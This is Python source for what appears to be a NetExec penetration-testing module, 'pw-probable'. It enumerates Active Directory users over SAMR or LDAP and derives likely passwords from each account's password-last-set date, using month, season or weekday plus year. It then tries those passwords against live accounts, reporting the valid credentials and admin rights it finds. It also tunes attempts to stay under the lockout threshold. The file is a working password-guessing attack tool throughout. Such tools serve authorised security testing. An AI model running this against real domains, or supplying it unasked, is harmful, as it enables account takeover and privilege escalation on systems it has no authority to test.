from datetime import datetime, timedelta
from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from enum import Enum
from contextlib import nullcontext

from impacket.ldap import ldapasn1 as ldapasn1_impacket
from impacket.ldap import ldap as ldap_impacket
from impacket.dcerpc.v5 import transport, samr
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5.rpcrt import DCERPC_v5
from impacket.nt_errors import STATUS_MORE_ENTRIES

from nxc.logger import nxc_logger
from nxc.protocols.smb.passpol import PassPolDump
from nxc.protocols.smb.samruser import UserSamrDump

from nxc.helpers.misc import CATEGORY


class AdUtilities:
    """Class containing common utilities for Active Directory."""

    @staticmethod
    def old_large_int_to_datetime(large_int):
        """Function to convert a AD timestamp as retrieved from last password set to a datetime."""
        combined = (large_int["HighPart"] << 32) | large_int["LowPart"]
        timestamp_seconds = combined / 10**7
        start_date = datetime(1601, 1, 1)
        return (start_date + timedelta(seconds=timestamp_seconds)).replace(microsecond=0)

    @staticmethod
    def ad_timestamp(timestamp):
        """Function to convert ad time stamp to unix compatible timestamp."""
        if timestamp != 0:
            return datetime(1601, 1, 1) + timedelta(seconds=timestamp / 10000000)

        return False

    @staticmethod
    def is_complex_password_policy(passpol):
        """Function to return if complex password flag is enabled."""
        bitmask = passpol["pass_prop"]

        return bool(int(bitmask) & 1)

    @staticmethod
    def is_disabled_account(userAccountControl):
        """Function to return if account is disabled."""
        return userAccountControl & 2

    @staticmethod
    def is_machine_account(user):
        """Function to return if account is a machine account (ends in $)."""
        return user[-1] == "$"

    @staticmethod
    def is_common_account(user, common_users=None):
        """Function to return if user is a common account."""
        common_users = common_users if common_users else ["krbtgt", "Guest"]

        return user in common_users


@dataclass
class UserAccount:
    """Dataclass for user accounts."""
    sAMAccountName: str = field(default="")
    pwdLastSet: str = field(default="")
    userAccountControl: int = field(default=0)
    badPwdCount: int = field(default=0)
    description: str = field(default="")


@dataclass
class DomainHandle:
    """Dataclass for domain handle."""
    handle: object
    name: str


class IUserListHandler(ABC):
    """Abstract class for handler object."""

    @abstractmethod
    def start(self):
        """Placeholder for start function."""

    @abstractmethod
    def handle(self, user: UserAccount):
        """Placeholder for handle function."""

    @abstractmethod
    def cleanup(self):
        """Placeholder for cleanup function."""


class AccountThresholdException(Exception):
    """Account threshold exception."""


class UserSamrDumpWithHandlers(AdUtilities):
    """A stripped back version of the  UserSamrDump class (protocols/smb/UserSamrDump.py), supports handlers to abstract logic and removes explicit user output."""

    KNOWN_PROTOCOLS = {
        "139/SMB": (r"ncacn_np:%s[\pipe\samr]", 139),
        "445/SMB": (r"ncacn_np:%s[\pipe\samr]", 445),
    }

    def __init__(self, connection, handlers=None):
        self.logger = connection.logger
        self.addr = connection.host if not connection.kerberos else connection.hostname + "." + connection.domain
        self.protocol = connection.args.port
        self.username = connection.username
        self.password = connection.password
        self.domain = connection.domain
        self.hash = connection.hash
        self.lmhash = ""
        self.nthash = ""
        self.aesKey = connection.aesKey
        self.doKerberos = connection.kerberos
        self.host = connection.host
        self.kdcHost = connection.kdcHost
        self.protocols = UserSamrDump.KNOWN_PROTOCOLS.keys()
        self.users = []
        self.rpc_transport = None
        self.dce = None
        self.handlers = handlers if handlers else []

        if self.hash is not None:
            if self.hash.find(":") != -1:
                self.lmhash, self.nthash = self.hash.split(":")
            else:
                self.nthash = self.hash

        if self.password is None:
            self.password = ""

    def add_handler(self, handler: IUserListHandler):
        """Add an additional handler."""
        self.handlers.append(handler)

    def dump(self, requested_users=None, dump_path=None):
        """Get a dump of users in UserAccount objects."""
        # Try all requested protocols until one works.
        for protocol in self.protocols:
            try:
                protodef = UserSamrDump.KNOWN_PROTOCOLS[protocol]
                port = protodef[1]
            except KeyError:
                self.logger.debug(f"Invalid Protocol: {protocol}")

            self.logger.debug(f"Trying protocol {protocol}")
            self.rpc_transport = transport.SMBTransport(
                    self.addr,
                    port,
                    r"\samr",
                    self.username,
                    self.password,
                    self.domain,
                    self.lmhash,
                    self.nthash,
                    self.aesKey,
                    doKerberos=self.doKerberos,
                    kdcHost=self.kdcHost,
                    remote_host=self.host)
            try:
                self.fetch_users(requested_users, dump_path)
                break
            except Exception as e:
                self.logger.debug(f"Connection with protocol {protocol} failed: {e}")

        return self.users

    def connect(self):
        """Establish connection to Samr."""
        self.dce = DCERPC_v5(self.rpc_transport)
        self.dce.connect()
        self.dce.bind(samr.MSRPC_UUID_SAMR)

    def get_domain_handle(self):
        """Get the domain handle for Samr."""
        resp = samr.hSamrConnect2(self.dce)
        self._ensure_success(resp, "Connect error")

        resp2 = samr.hSamrEnumerateDomainsInSamServer(
            self.dce,
            serverHandle=resp["ServerHandle"],
            enumerationContext=0,
            preferedMaximumLength=500,
        )
        self._ensure_success(resp2, "Connect error")
        domain_name = resp2["Buffer"]["Buffer"][0]["Name"]

        resp3 = samr.hSamrLookupDomainInSamServer(
            self.dce,
            serverHandle=resp["ServerHandle"],
            name=domain_name,
        )

        self._ensure_success(resp3, "Connect error")

        resp4 = samr.hSamrOpenDomain(
            self.dce,
            serverHandle=resp["ServerHandle"],
            desiredAccess=samr.MAXIMUM_ALLOWED,
            domainId=resp3["DomainId"],
        )
        self._ensure_success(resp4, "Connect error")

        self.__domains = resp2["Buffer"]["Buffer"]

        return DomainHandle(handle=resp4["DomainHandle"], name=domain_name)

    def fetch_users(self, requested_users, dump_path):
        """Get a list of the users."""
        # Setup Connection
        self.connect()
        domain_handle = self.get_domain_handle()
        # End Setup

        if requested_users:
            self.users = self.targeted_user_lookup(domain_handle.handle, requested_users)
        else:
            self.users = self.all_user_lookup(domain_handle.handle)

        self.logger.display(f"Enumerated {len(self.users)} local users: {domain_handle.name}")
        self.write_log(dump_path, self.users)

        self.dce.disconnect()

        return self.users

    def targeted_user_lookup(self, domain_handle, requested_users):
        """Lookup specific users."""
        users = []

        self.logger.debug(f"Looping through users requested and looking up their information: {requested_users}")
        try:
            names_lookup_resp = samr.hSamrLookupNamesInDomain(self.dce, domain_handle, requested_users)
            rids = [r["Data"] for r in names_lookup_resp["RelativeIds"]["Element"]]
            self.logger.debug(f"Specific RIDs retrieved: {rids}")
            users = self.get_user_info(domain_handle, rids)
        except DCERPCException as e:
            self.logger.debug(f"Exception while requesting users in domain: {e}")
            if "STATUS_SOME_NOT_MAPPED" in str(e):
                # which user is not translated correctly isn't returned so we can't tell the user which is failing, which is very annoying
                self.logger.fail("One of the users requested does not exist in the domain, causing a critical failure during translation, re-check the users and try again")
            else:
                self.logger.fail(f"Error occurred when looking up users in domain: {e}")

        return users

    def all_user_lookup(self, domain_handle):
        """Enumerate all users."""
        status = STATUS_MORE_ENTRIES
        enumerationContext = 0

        while status == STATUS_MORE_ENTRIES:
            try:
                enumerate_users_resp = samr.hSamrEnumerateUsersInDomain(self.dce, domain_handle, enumerationContext=enumerationContext)
            except DCERPCException as e:
                if str(e).find("STATUS_MORE_ENTRIES") < 0:
                    self.logger.fail("Error enumerating domain user(s)")
                    break
                enumerate_users_resp = e.get_packet()

            rids = [r["RelativeId"] for r in enumerate_users_resp["Buffer"]["Buffer"]]
            self.logger.debug(f"Full domain RIDs retrieved: {rids}")
            users = self.get_user_info(domain_handle, rids)

            # set these for the while loop
            enumerationContext = enumerate_users_resp["EnumerationContext"]
            status = enumerate_users_resp["ErrorCode"]

            return users

        return None

    def write_log(self, path, users):
        """Write the final log."""
        if path:
            self.logger.display(f"Writing {len(users)} local users to {path}")
            with open(path, "w+") as file:
                file.writelines(f"{user.sAMAccountName}\n" for user in users)

    def get_user_info(self, domain_handle, user_ids):
        """Get the user's info from the domain."""
        self.logger.debug(f"Getting user info for users: {user_ids}")

        [handler.start() for handler in self.handlers]

        for user in user_ids:
            self.logger.debug(f"Calling hSamrOpenUser for RID {user}")
            open_user_resp = samr.hSamrOpenUser(
                self.dce,
                domain_handle,
                samr.MAXIMUM_ALLOWED,
                user
            )
            info_user_resp = samr.hSamrQueryInformationUser2(
                self.dce,
                open_user_resp["UserHandle"],
                samr.USER_INFORMATION_CLASS.UserAllInformation
            )["Buffer"]

            user_info = info_user_resp["All"]
            user_name = user_info["UserName"]
            bad_pwd_count = user_info["BadPasswordCount"]
            user_description = user_info["AdminComment"]
            last_pw_set = self.old_large_int_to_datetime(user_info["PasswordLastSet"])

            if last_pw_set == "1601-01-01 00:00:00":
                last_pw_set = "<never>"

            account = UserAccount(
                sAMAccountName=user_name,
                pwdLastSet=last_pw_set,
                userAccountControl=0,
                badPwdCount=bad_pwd_count,
                description=user_description)

            yield account

            # Passing the user onto any handlers.
            [handler.handle(account) for handler in self.handlers]

            samr.hSamrCloseHandle(self.dce, open_user_resp["UserHandle"])

    def _ensure_success(self, response, message):
        """Convenience wrapper for checking response from samr"""
        if response["ErrorCode"] != 0:
            raise Exception(message)

    def __del__(self):
        # Cleanup handlers
        [handler.cleanup() for handler in self.handlers]


class UserListNullHandler(IUserListHandler):
    """Null Handler."""

    def start(self):
        """Null for start function."""

    def handle(self, user: UserAccount):
        """Null for handle function."""

    def cleanup(self):
        """Null for cleanup function."""


class UserListPrinterHandler(IUserListHandler):
    """Handles the output of a user list table."""
    def __init__(self, connection):
        self.connection = connection

    def start(self):
        """Output a user list table header."""
        self.connection.logger.highlight(f"{'-Username-':<30}{'-Last PW Set-':<20}{'-BadPW-':<8}{'-Description-':<60}")

    def handle(self, user: UserAccount):
        """Output a user list entry."""
        last_pw_set = user.pwdLastSet.strftime("%Y-%m-%d %H:%M:%S")

        self.connection.logger.highlight(f"{user.sAMAccountName:<30}{last_pw_set:<20}{user.badPwdCount:<8}{user.description} ")

    def cleanup(self):
        pass


class ConnectionType(str, Enum):
    LDAP = "ldap",
    SMB = "smb"


class NXCModule(AdUtilities):
    """
    Attempt most probable passwords by observing the password's last update date and forming a password list from this.
    Module by @edonsec

    Gathers password policy to understand if Complex is enabled (point in time, old passwords may still be vulnerable)

    Loops through users
     - Where pwdLastSet is not null, calculate passwords of the following:
     - <Month><Year Short> - i.e. December23
     - <Month><Year Long> - i.e. December2025
     - <Season><Year Short> - i.e. Winter23
     - <season><Year Long> - i.e. Winter2025
     - <Day of week><Year Short> - Thursday23
     - <Day of week><Year Long> - Thursday2025

     Advanced options include PREFIX and SUFFIX, i.e. Welcome2025! could be generated with -o PREFIX="Welcome" PWSELECTION="Y" SUFFIX='!'.
    """

    name = "pw-probable"
    description = "Brute force password based on password last set date strategies. Often passwords are reset using this behaviour."
    supported_protocols = ["ldap", "smb"]
    opsec_safe = False
    multiple_hosts = True
    category = CATEGORY.PRIVILEGE_ESCALATION

    def __init__(self):
        self.ignore_complex = False
        self.only_complex = False
        self.include_common = False
        self.include_machine = False
        self.include_lowercase = False
        self.include_uppercase = False
        self.exclude_users = False
        self.output_users = False
        self.pw_selection = False
        self.outfile = False
        self.us_compliant = False
        self.target_users = None
        self.prefix = ""
        self.suffix = ""
        self.ldap_threshold = 0

    def options(self, context, module_options):
        """
        Password Selection:
        PWSELECTION     Provide a comma separated list of compatible values: D (Day), M (Month), S (Season), Y (Year) and y (Year short). Then the complex compatible Year Long (YL - 2025), Year Short (YS - 23).
        Example: DYL,MYL,SYS. This sets the order of precedence too, so prioritise the passwords most likely.
        PREFIX          A prefix to apply to each password.
        SUFFIX          A suffix to apply to each password.
        IGNORECOMPLEX   Forces use of non-complex passwords.
        ONLYCOMPLEX     Forces only complex password subset.
        INCLUDELOWER    Include all passwords in lowercase.
        INCLUDEUPPER    Include all passwords in uppercase.

        Account Selection:
        INCLUDECOMMON   Include common accounts krbtgt and Guest.
        INCLUDEMACHINE  Include Machine accounts (Accounts ending in $).
        EXCLUDEUSERS    A comma separated list of users to exclude.
        TARGETUSERS     A comma seperated list of users, to target specific users.

        Miscellaneous:
        OUTFILE         Create a new password list and does not attempt to use the passwords. A file is generated containing a tab seperated list of usernames and passwords.
        OUTPUTUSERS     Outputs in nxc format the list of users in output. Default: False
        US              Uses "Fall" in place of "Autumn" for US compatibility.
        LDAPTHRESHOLD   Overrides the threshold protection to force x attempts, this is required when badPwdCount is above allowed but outside of observation window. This can lead to account lockout if used incorrectly.
        """
        if "IGNORECOMPLEX" in module_options:
            self.ignore_complex = True
        if "ONLYCOMPLEX" in module_options:
            self.only_complex = True
        if "INCLUDECOMMON" in module_options:
            self.include_common = True
        if "INCLUDEMACHINE" in module_options:
            self.include_machine = True
        if "INCLUDELOWER" in module_options:
            self.include_lowercase = True
        if "INCLUDEUPPER" in module_options:
            self.include_uppercase = True
        if "EXCLUDEUSERS" in module_options:
            self.exclude_users = module_options["EXCLUDEUSERS"].split(",")
        if "OUTPUTUSERS" in module_options:
            self.output_users = True
        if "PWSELECTION" in module_options:
            self.pw_selection = module_options["PWSELECTION"].split(",")
        if "OUTFILE" in module_options:
            self.outfile = module_options["OUTFILE"]
        if "TARGETUSERS" in module_options:
            self.target_users = module_options["TARGETUSERS"].split(",")
        if "SUFFIX" in module_options:
            self.suffix = module_options["SUFFIX"]
        if "PREFIX" in module_options:
            self.prefix = module_options["PREFIX"]
        if "US" in module_options:
            self.us_compliant = True
        if "LDAPTHRESHOLD" in module_options:
            self.ldap_threshold = int(module_options["LDAPTHRESHOLD"])

    def on_login(self, context, connection):
        """Called on each login and based on connection type triggers ldap or smb logins respectively."""
        connection_type = self.get_connection_type(connection)
        original_user = connection.username
        valid_users = []

        pass_pol_dump = PassPolDump(connection)
        passpol = pass_pol_dump.dump()

        accounts = []

        dispatch = {
            ConnectionType.LDAP: self._process_ldap,
            ConnectionType.SMB: self._process_smb
        }

        accounts = dispatch[connection_type](context, connection, passpol)

        if accounts:
            context.log.debug("Attempting logins...")
            valid_users = self._process_accounts(accounts, passpol, original_user, connection, context)
        else:
            context.log.debug("Failed to get accounts.")

        if self.outfile:
            context.log.highlight(f'A file "{self.outfile}" has been written containing the users and probable passwords.')
            return

        if len(valid_users) > 0:
            context.log.success("Found the following users: ")
            for valid_user in valid_users:
                context.log.highlight(f"User: {valid_user[0]}; Password: {valid_user[1]}; Admin: {valid_user[2]}")
        else:
            context.log.success("No users found.")

    def generate_password_set(self, dt, complex_pol=False, pw_selection=False):
        """Generate a list of probable passwords based on pw last set date."""
        if not dt:
            return None

        season = self.get_season(dt)

        password_attempts = {
            "MYS": dt.strftime("%B%y"),  # <Month><Year Short>
            "MYL": dt.strftime("%B%Y"),  # <Month><Year Long>
            "SYS": season + dt.strftime("%y"),  # <Season><Year Short>
            "SYL": season + dt.strftime("%Y"),  # <Season><Year Long>
            "DYS": dt.strftime("%A%y"),  # <Day of week><Year Short>
            "DYL": dt.strftime("%A%Y"),  # <Day of week><Year Long>
            "M": dt.strftime("%B"),  # Month
            "S": season,  # Season
            "D": dt.strftime("%A"),  # Day of week
            "Y": dt.strftime("%Y"),  # Year
            "y": dt.strftime("%y")   # Year short
        }

        complex_compliant = ["MYS", "MYL", "SYS", "SYL", "DYS", "DYL"]
        simple = ["M", "S", "D"]

        subset = []

        subset = pw_selection or (complex_compliant if complex_pol else complex_compliant + simple)

        passwords = [self.prefix + password_attempts[key] + self.suffix for key in subset if key in password_attempts]

        if self.include_lowercase:
            passwords = passwords + [password_attempts[key].lower() for key in subset if key in password_attempts]

        if self.include_uppercase:
            passwords = passwords + [password_attempts[key].upper() for key in subset if key in password_attempts]

        return passwords

    def get_connection_type(self, connection):
        return ConnectionType(connection.__class__.__name__)

    def get_season(self, dt):
        """Method to return season of date"""
        month = dt.month
        if month in [12, 1, 2]:
            return "Winter"
        if month in [3, 4, 5]:
            return "Spring"
        if month in [6, 7, 8]:
            return "Summer"

        return "Fall" if self.us_compliant else "Autumn"

    def _process_smb(self, context, connection, passpol):
        """Process the SMB connection and return users."""
        users = UserSamrDumpWithHandlers(connection)
        user_handler = UserListPrinterHandler(connection) if self.output_users else UserListNullHandler()

        users.add_handler(user_handler)

        return users.dump(self.target_users)

    def _process_ldap(self, context, connection, passpol):
        """Method to process the LDAP connection and return users."""
        try:
            search_filter = self.generate_ldap_search(self.target_users)
            context.log.debug(f"Search Filter={search_filter}")

            resp = connection.search(
                searchFilter=search_filter,
                attributes=["sAMAccountName", "pwdLastSet", "userAccountControl", "badPwdCount", "description"],
                sizeLimit=0,
            )
        except ldap_impacket.LDAPSearchError as e:
            if e.getErrorString().find("sizeLimitExceeded") >= 0:
                context.log.debug("sizeLimitExceeded exception caught, giving up and processing the data received")
                # We reached the sizeLimit, process the answers we have already and that's it. Until we implement
                # paged queries
                resp = e.getAnswers()
            else:
                nxc_logger.debug(e)
                return

        user_list_handler = UserListPrinterHandler(connection) if self.output_users else UserListNullHandler()
        user_list_handler.start()

        context.log.debug(f"Total of records returned {len(resp)}")

        for item in resp:
            if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                continue

            account = UserAccount()

            try:
                for attribute in item["attributes"]:
                    if str(attribute["type"]) == "sAMAccountName":
                        account.sAMAccountName = str(attribute["vals"][0])
                    elif str(attribute["type"]) == "pwdLastSet":
                        account.pwdLastSet = self.ad_timestamp(int(attribute["vals"][0]))
                    elif str(attribute["type"]) == "userAccountControl":
                        account.userAccountControl = int(attribute["vals"][0])
                    elif str(attribute["type"]) == "badPwdCount":
                        account.badPwdCount = int(attribute["vals"][0])
                    elif str(attribute["type"]) == "description":
                        account.description = str(attribute["vals"][0])

                yield account
                user_list_handler.handle(account)
            except Exception as e:
                context.log.debug("Exception:", exc_info=True)
                context.log.debug(f"Skipping item, cannot process due to error {e!s}")

        user_list_handler.cleanup()

    def safe_open(self, path, mode, encoding="utf-8"):
        """Context aware open"""
        return open(path, mode, encoding=encoding) if path else nullcontext(None)

    def _process_accounts(self, accounts, passpol, original_user, connection, context):
        """Process account objects and attempt login."""
        valid_users = []
        with self.safe_open(self.outfile, "a+", encoding="utf-8") as fp:
            for account in accounts:
                if self.is_skippable_account(account, original_user, context):
                    continue

                context.log.debug(f"{account.sAMAccountName} password last set {account.pwdLastSet}")

                only_complex = self.is_complex_password_policy(passpol) and not self.ignore_complex
                only_complex = only_complex if only_complex else self.only_complex

                password_set = self.generate_password_set(account.pwdLastSet, only_complex, self.pw_selection)

                try:
                    threshold = self.handle_threshold(account, passpol, context, connection)
                except AccountThresholdException as e:
                    context.log.highlight(str(e))
                    continue

                if threshold > 0 and password_set and not self.outfile:
                    password_set = password_set[0:threshold]

                if password_set:
                    for pw in password_set:
                        if fp:
                            fp.write(f"{account.sAMAccountName}\t{pw}\n")
                            continue

                        connection.admin_privs = False  # Reset each time

                        valid_user = connection.plaintext_login(connection.domain, account.sAMAccountName, pw)

                        if valid_user:
                            valid_users.append([
                                account.sAMAccountName,
                                pw,
                                connection.admin_privs
                            ])

                            break

        return valid_users

    def generate_ldap_search(self, target_users):
        """Create the ldap search string."""
        search_filter = "(objectclass=user)"

        if target_users:
            search_filter = "(&" + search_filter + "(|" + "".join(f"(sAMAccountName={user})" for user in target_users) + "))"

        return search_filter

    def is_skippable_account(self, account: UserAccount, original_user, context):
        """Identify if an account should be skipped from processing."""
        if account.sAMAccountName == "" or account.pwdLastSet == "":
            return True
        if original_user.lower() == account.sAMAccountName.lower():
            return True
        if self.is_machine_account(account.sAMAccountName) and not self.include_machine:
            return True
        if self.is_common_account(account.sAMAccountName) and not self.include_common:
            return True
        if self.is_disabled_account(account.userAccountControl):
            context.log.debug(f"{account.sAMAccountName} is disabled.")
            return True
        if self.exclude_users and account.sAMAccountName in self.exclude_users:
            return True

    def handle_threshold(self, account: UserAccount, passpol, context, connection):
        """Handle account lockout threshold. Allows n-1 account attempts before throwing an exception."""
        threshold = 0
        if passpol["accnt_lock_thres"] != "None":
            threshold = int(passpol["accnt_lock_thres"]) - 1
            context.log.debug(f"Threshold for user {account.sAMAccountName} = {threshold} and bad count = {account.badPwdCount}.")

        if threshold:
            if self.ldap_threshold:
                if self.ldap_threshold > threshold:
                    raise AccountThresholdException("Override cannot exceed threshold or account lockout is possible.")

                self.ldap_threshold -= 1

                return self.ldap_threshold

            if account.badPwdCount >= threshold:
                reset_lock = passpol["rst_accnt_lock_counter"].strip()
                msg = f'The user "{account.sAMAccountName}" has exceeded the lockout threshold, please try again in {reset_lock}.'

                if self.get_connection_type(connection) == ConnectionType.LDAP:
                    msg += " This may be a false positive as LDAP does not reset the badPwdCount after lockOutObservationWindow has passed. If you know this to be the case, you may force an alternative threshold with LDAPTHRESHOLD=<THRESHOLD> to override the allowed attempts before throwing this error; however, be aware that no guardrails are in place to prevent account lockouts if called multiple times and exceeds the counter. Alternatively use SMB instead which does not exhibit this behaviour."

                raise AccountThresholdException(msg)

            if account.badPwdCount != 0:
                threshold = threshold - account.badPwdCount

        return threshold
